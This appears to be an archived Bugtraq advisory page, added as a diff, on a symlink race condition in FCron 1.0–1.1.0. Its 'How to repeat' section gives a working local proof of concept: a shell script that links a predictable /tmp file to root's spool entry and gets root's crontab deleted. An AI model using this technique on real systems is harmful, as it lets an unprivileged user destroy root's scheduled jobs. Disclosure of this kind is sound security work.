@@ -1,0 +1,109 @@
+#SpeeDr00t@Black Falcon<br>#bid2835<p><b><span style="font-size: 18pt;">Thibault Godouet Fcron Symbolic Link Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/2835/info">info</a><br><a href="http://www.securityfocus.com/bid/2835/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/2835/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/2835/solution">solution</a><br><a href="http://www.securityfocus.com/bid/2835/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				2835
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Race Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 07 2001 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 07 2001 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Reported by Uwe Ohse &lt;uwe@ohse.de&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Thibault Godouet FCron 1.1 .0<br/>
+					
+				
+					Thibault Godouet FCron 1.0.3 <br/>
+					
+				
+					Thibault Godouet FCron 1.0.2 <br/>
+					
+				
+					Thibault Godouet FCron 1.0.1 <br/>
+					
+				
+					Thibault Godouet FCron 1.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Thibault Godouet FCron 1.1.1 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	How to repeat:<br/><br/>  1. Install a crontab, for example for the root user:<br/><br/>        root# ls -l /var/spool/fcron/<br/>        total 0<br/>        root# echo '0 0 * * * echo test' | fcrontab -<br/>        09:53:00 installing file /tmp/fcrontab.27301 for user root<br/>        Modifications will be taken into account right now.<br/>        root# ls -l /var/spool/fcron/<br/>        total 2<br/>        -rw-------   1 root     root          110 May  7 09:53 root<br/>        -rw-------   1 root     fcron          20 May  7 09:53 root.orig<br/><br/><br/>  2. As a normal user write and execute a script:<br/><br/>    uwe$ cat ~/x<br/>    #! /bin/sh<br/>    ln -s /var/spool/fcron/rm.root /tmp/fcrontab.$$<br/>   exec fcrontab - &lt;&lt;EOF<br/>    * * * * * false<br/>    EOF<br/>    uwe$ ./x<br/>    09:55:55 installing file /tmp/fcrontab.27536 for user uwe<br/>    09:55:55 User uwe can't read file "/tmp/fcrontab.27536": Permission denied<br/><br/>  3. As root look into the fcron spool directory:<br/><br/>    root# ls -l /var/spool/fcron/<br/>    total 3<br/>    -rw-r-----   1 uwe      fcron          16 May  7 09:55 rm.root<br/>    -rw-------   1 root     root          110 May  7 09:53 root<br/>    -rw-------   1 root     fcron          20 May  7 09:53 root.orig<br/><br/>  4. As the normal user edit your crontab:<br/><br/>    uwe$ echo '* * * * * true' | fcrontab -<br/>    09:59:15 installing file /tmp/fcrontab.27543 for user uwe<br/>    Modifications will be taken into account at 10h00.<br/><br/>  5. As root wait up to a minute and look into the fcron spool directory:<br/><br/>    # ls -l /var/spool/fcron/<br/>    total 3<br/>    -rw-------   1 root     fcron          20 May  7 09:53 root.orig<br/>    -rw-------   1 root     root          102 May  7 09:59 uwe<br/>    -rw-r-----   1 fcron    fcron          15 May  7 09:59 uwe.orig<br/><br/>  6. Root's crontab is gone, look into your backups.
+	
+		<ul>
+</ul>
+</div>
